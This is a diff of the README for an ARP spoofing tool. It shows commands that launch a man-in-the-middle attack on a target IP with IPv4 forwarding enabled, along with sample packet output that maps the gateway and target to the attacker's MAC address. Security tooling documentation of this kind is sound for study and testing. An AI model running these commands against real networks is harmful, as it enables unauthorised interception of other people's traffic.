@@ -19,7 +19,7 @@ run by any Python 3.x interpreter.
 Simply clone this repository with `git clone` and execute the `arpspoof.py` file 
 as described in the following **Usage** section.
 
-```sh
+```
 user@host:~/DIR$ git clone https://github.com/EONRaider/Arp-Spoofer.git
 ```
 
@@ -75,7 +75,7 @@ user@host:~$ python3 arpspoof.py TARGET_IP -f
 - Let's perform an attack against a target with IP address `10.0.1.6`.
 *Notice how the remaining settings are automatically obtained,
 including a setup for forwarding of IPv4 packets to enable a MITM
-attack (enabled by the -f switch).*
+attack (set by the -f switch).*
 
 ```
 user@host:~$ sudo python3 arpspoof.py 10.0.1.6 -f
@@ -99,7 +99,7 @@ user@host:~$ sudo python3 arpspoof.py 10.0.1.6 -f
 as the attack initiated above takes place. *Check that packets #5 and #6
 map the gateway and target IP addresses to the attacker MAC address:*
 
-```sh
+```
 [>] Packet #1 at 14:10:12:
     [+] MAC ......08:92:27:dc:3a:71 -> ff:ff:ff:ff:ff:ff
     [+] ARP Who has      10.0.1.6 ? -> Tell 10.0.1.5
@@ -122,10 +122,12 @@ map the gateway and target IP addresses to the attacker MAC address:*
     [+] ARP ...............10.0.1.1 -> Is at 08:92:27:dc:3a:71
 ```
 
+*And that's it! The attack will persist until otherwise aborted.*
+
 ### But how is this possible?
 
 The simplest command for this tool consists of
-`sudo python3 arpspoof.py TARGET_IP`.
+`sudo python3 arpspoof.py TARGET_IP`
 
 Then where do the remaining settings such as Target MAC, Gateway IP and
 Attacker MAC come from? How is IPv4 forwarding enabled?
